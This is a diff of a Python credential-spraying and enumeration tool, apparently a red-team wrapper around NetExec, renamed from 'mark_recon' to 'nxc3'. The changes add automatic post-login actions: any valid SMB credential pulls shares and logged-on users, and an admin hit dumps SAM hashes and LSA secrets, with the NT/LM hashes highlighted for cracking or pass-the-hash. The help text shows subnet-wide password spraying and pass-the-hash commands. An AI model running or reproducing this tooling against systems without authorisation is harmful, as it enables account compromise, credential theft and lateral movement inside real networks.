@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-mark_recon — credential spray & enumeration wrapper around NetExec (nxc)
+nxc3 — credential spray & enumeration wrapper around NetExec (nxc)
 
 Runs nxc across multiple protocols and credential pairs, surfaces hits with
 suggested follow-up commands, and optionally outputs a ready-to-run shell
@@ -73,6 +73,14 @@ def hl_comment(text: str, base: str = "") -> str:
     if not ORANGE:
         return text
     return _COMMENT_RE.sub(lambda m: f"{ORANGE}{m.group(0)}{RESET}{base}", text)
+
+# NT hash (32 hex) or LM:NT pair — highlighted orange in dumped output so the
+# crackable/PtH-able hashes stand out.
+_HASH_RE = re.compile(r"\b[a-fA-F0-9]{32}(?::[a-fA-F0-9]{32})?\b")
+def hl_hash(text: str, base: str = "") -> str:
+    if not ORANGE:
+        return text
+    return _HASH_RE.sub(lambda m: f"{ORANGE}{m.group(0)}{RESET}{base}", text)
 
 
 # ─── Protocol config ───────────────────────────────────────────────────
@@ -170,6 +178,7 @@ class TargetResult:
     protocol_lines:   dict[str, list[tuple[str,str]]] = field(default_factory=dict)
     target_info: str = ""; scanned: bool = True; skipped_reason: str = ""
     nmap_ports: list[tuple[int,str,str]] = field(default_factory=list)  # (port, service, version)
+    cred_enum:  list[tuple[str,list[str]]] = field(default_factory=list)  # credentialed enum sections
 
 
 # ─── CME-style formatter ───────────────────────────────────────────────
@@ -525,10 +534,27 @@ def print_target_block(result: TargetResult, extra_hash: str|None,
             scope = "local" if s.local_auth else "domain"
             auth  = s.auth_type.value if s.auth_type != AuthType.PASSWORD else "password"
             tag   = f"{s.protocol.upper()}/{scope}/{auth}"
-            if   s.is_guest: qual = f"  {YELLOW}[guest — enumerate shares]{RESET}"
-            elif s.is_admin: qual = f"  {GREEN}{BOLD}[ADMIN — Pwn3d!]{RESET}"
-            else:            qual = f"  {GREEN}[valid]{RESET}"
+            # Distinguish privilege honestly: Pwn3d on a DC ~ Domain Admin; Pwn3d
+            # on a member = Local Admin of that box; otherwise it's just a user.
+            if   s.is_guest:
+                qual = f"  {YELLOW}[guest]{RESET}"
+            elif s.is_admin and result.is_dc and not s.local_auth:
+                qual = f"  {RED}{BOLD}[DOMAIN ADMIN — admin on the DC!]{RESET}"
+            elif s.is_admin:
+                qual = f"  {GREEN}{BOLD}[LOCAL ADMIN — Pwn3d on this host]{RESET}"
+            else:
+                who = "local user" if s.local_auth else "domain user"
+                qual = f"  {GREEN}[valid — {who}]{RESET}"
             iprint("[+]", f"{s.raw_message}   [{tag}]{qual}")
+        print(flush=True)
+
+    # ── credentialed enumeration actually pulled with the winning cred ──
+    if result.cred_enum:
+        for label, lines in result.cred_enum:
+            tag = f"{RED}" if "SAM" in label or "LSA" in label else f"{CYAN}"
+            print(f"  {tag}[+]{RESET} {label} ({len(lines)}):", flush=True)
+            for ln in lines[:60]:
+                print(f"      {hl_hash(ln)}", flush=True)
         print(flush=True)
 
     seen_info: set[tuple[str, str]] = set()
@@ -645,7 +671,7 @@ def probe_protocols(host: str, protos: list[str]) -> list[str]:
 
 # ─── Credential / script file output ───────────────────────────────────
 CREDS_HEADER = (
-    "# mark_recon valid credentials\n"
+    "# nxc3 valid credentials\n"
     "# target\tprotocol\tscope\tdomain\tuser\tauth_type\tsecret\tprivilege\ttimestamp\n"
 )
 
@@ -667,7 +693,7 @@ def append_creds(path: str, result: TargetResult) -> None:
 
 
 # ─── Orchestrator ──────────────────────────────────────────────────────
-class MarkRecon:
+class Nxc3:
     def __init__(self, *, targets, users, passwords, hashes, kerberos,
                  protocols, log_file, creds_file, json_out, save_file, script_file,
                  workers, target_workers, quiet, verbose, debug, no_port_probe, extra_hash,
@@ -949,7 +975,9 @@ class MarkRecon:
             if stderr and not stdout:
                 for raw in stderr.split("\n"):
                     if raw.strip(): lines.append(("[-]", raw.strip()))
-        if not lines and proto in self.protocols:
+        # In recon-only mode (no creds) the nmap ports already list the services,
+        # so the "PROTO service detected" lines are just noise — skip them.
+        if not lines and proto in self.protocols and not self.recon_only:
             message = f"{proto.upper()} service detected"
             if not had_output:
                 message += " (no nxc output)"
@@ -1000,6 +1028,32 @@ class MarkRecon:
                                              "print" in msg.lower()):
                 lines.append(msg)
         return lines
+
+    def _cred_enum(self, ip: str, s: Success) -> list[tuple[str, list[str]]]:
+        """With a WINNING cred, actually pull data — shares always, and SAM/LSA
+        dumps + logged-on users when the cred is admin (Pwn3d). Returns sections."""
+        def base() -> list[str]:
+            c = ["nxc", "smb", ip, "-u", s.user]
+            if s.auth_type == AuthType.KERBEROS: c.append("--use-kcache")
+            elif s.auth_type == AuthType.HASH:   c += ["-H", s.secret]
+            else:                                c += ["-p", s.secret]
+            if s.local_auth: c.append("--local-auth")
+            return c + ["--timeout", str(NETEXEC_TIMEOUT)]
+        checks = [("shares", base() + ["--shares"]),
+                  ("logged-on users", base() + ["--loggedon-users"])]
+        if s.is_admin:   # Pwn3d — dump local creds
+            checks += [("SAM hashes (local)", base() + ["--sam"]),
+                       ("LSA secrets",        base() + ["--lsa"])]
+        out: list[tuple[str, list[str]]] = []
+        for label, cmd in checks:
+            if self._stop.is_set(): break
+            try: so, _, timed = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
+            except InterruptedError: break
+            if timed: continue
+            lines = [l for l in self._parse_nxc_findings(so)
+                     if not set(l) <= set("- ")]      # drop separator rows
+            if lines: out.append((label, lines))
+        return out
 
     # ── one target ─────────────────────────────────────────────────────
     def _scan_target(self, target: str,
@@ -1116,6 +1170,13 @@ class MarkRecon:
         if self.auto_enum and (result.anon_smb or result.guests):
             result.share_lines = self._auto_enum_shares(
                 result.real_ip, result.hostname)
+
+        # Credentialed enum: a valid SMB cred actually pulls shares (+ SAM/LSA on
+        # an admin hit) instead of just reporting that the login worked.
+        if self.auto_enum and not self._stop.is_set():
+            smb_ok = next((s for s in result.successes if s.protocol == "smb"), None)
+            if smb_ok:
+                result.cred_enum = self._cred_enum(result.real_ip, smb_ok)
 
         # collect the background nmap service scan
         if nmap_future is not None:
@@ -1333,7 +1394,7 @@ class MarkRecon:
         print_info("[!]", f"port probe skipped {len(skipped)}/{len(results)} targets with no open checked ports")
         if len(skipped) == len(results):
             print_info("[!]", "no targets reached nxc; retry with --no-port-probe or raise --target-workers more slowly")
-            print_info("[*]", "example: mark_recon -t <target> -u <user> -p <pass> --no-port-probe --target-workers 3")
+            print_info("[*]", "example: nxc3 -t <target> -u <user> -p <pass> --no-port-probe --target-workers 3")
         print()
 
     # ── banner ─────────────────────────────────────────────────────────
@@ -1342,7 +1403,7 @@ class MarkRecon:
               else ",".join(self.protocols))
         cl = f"{len(self.passwords)}p / {len(self.hashes)}h"
         print()
-        print_info("[*]", f"{CYAN}{BOLD}mark_recon{RESET}  |  "
+        print_info("[*]", f"{CYAN}{BOLD}nxc3{RESET}  |  "
                           f"{len(self.targets)} targets  "
                           f"{len(self.users)} users  {cl}  {self.workers} workers")
         if not self.spray:
@@ -1417,7 +1478,7 @@ class MarkRecon:
         """Write a ready-to-run bash script with all suggested commands."""
         lines = [
             "#!/bin/bash",
-            f"# mark_recon — generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+            f"# nxc3 — generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             "# Review carefully before running.",
             "# Remove the 'exit 0' at the bottom when ready.",
             "", "set -euo pipefail", "",
@@ -1595,9 +1656,10 @@ class MarkRecon:
                          self.json_out  or self.log_file or self.script_file)
         if not has_dcs and not has_files: return
 
-        print_info("[*]", "next steps")
-
+        # Only show the "next steps" header when there's real AD content — in
+        # recon mode (no DC owned) the nmap per-port hints already cover it.
         if has_dcs:
+            print_info("[*]", "next steps")
             print_info("[*]", "domain controllers", indent=1)
             for domain, hosts in dcs.items():
                 for hostname, ip in hosts:
@@ -1636,9 +1698,9 @@ class MarkRecon:
 # ─── CLI ───────────────────────────────────────────────────────────────
 def parse_args() -> argparse.Namespace:
     p = argparse.ArgumentParser(
-        prog="mark_recon",
+        prog="nxc3",
         description=(
-            f"{BOLD}mark_recon{RESET} — all-in-one recon: nmap service scan + "
+            f"{BOLD}nxc3{RESET} — all-in-one recon: nmap service scan + "
             f"NetExec (nxc) across every protocol\n"
             f"Point it at a target (with or without creds). Discovers hosts, scans "
             f"ports/services, tests creds where given, and surfaces next-step commands. "
@@ -1649,26 +1711,26 @@ def parse_args() -> argparse.Namespace:
 {BOLD}EXAMPLES{RESET}
 
   Basic spray against a single host:
-    mark_recon -t 192.168.1.10 -u admin -p 'Password123'
+    nxc3 -t 192.168.1.10 -u admin -p 'Password123'
 
   CIDR range, multiple users and passwords:
-    mark_recon -t 192.168.1.0/24 -u users.txt -p passwords.txt
+    nxc3 -t 192.168.1.0/24 -u users.txt -p passwords.txt
 
   Pass-the-Hash:
-    mark_recon -t 192.168.1.10 -u admin -H aad3b435...:31d6cfe0...
+    nxc3 -t 192.168.1.10 -u admin -H aad3b435...:31d6cfe0...
 
   Kerberos ticket cache:
-    mark_recon -t dc01.corp.local -u admin -k
+    nxc3 -t dc01.corp.local -u admin -k
 
   Specific protocols only:
-    mark_recon -t 192.168.1.10 -u admin -p pw --protocols smb,winrm,rdp
+    nxc3 -t 192.168.1.10 -u admin -p pw --protocols smb,winrm,rdp
 
   {BOLD}Lockout-safe spray across subnet (recommended for AD){RESET}:
-    mark_recon -t 192.168.1.0/24 -u users.txt -p passwords.txt \\
+    nxc3 -t 192.168.1.0/24 -u users.txt -p passwords.txt \\
                --spray --spray-delay 30
 
   Full output suite with auto share enumeration:
-    mark_recon -t targets.txt -u users.txt -p passwords.txt \\
+    nxc3 -t targets.txt -u users.txt -p passwords.txt \\
                --spray --spray-delay 60 --auto-enum \\
                --creds-file creds.tsv --script cmds.sh -S output.txt
 
@@ -1814,7 +1876,7 @@ def main() -> int:
         log_file   = args.output or datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
         extra_hash = hashes[0] if hashes else None
 
-        runner = MarkRecon(
+        runner = Nxc3(
             targets=targets, users=users, passwords=passwords,
             hashes=hashes, kerberos=args.kerberos,
             protocols=protocols, log_file=log_file,
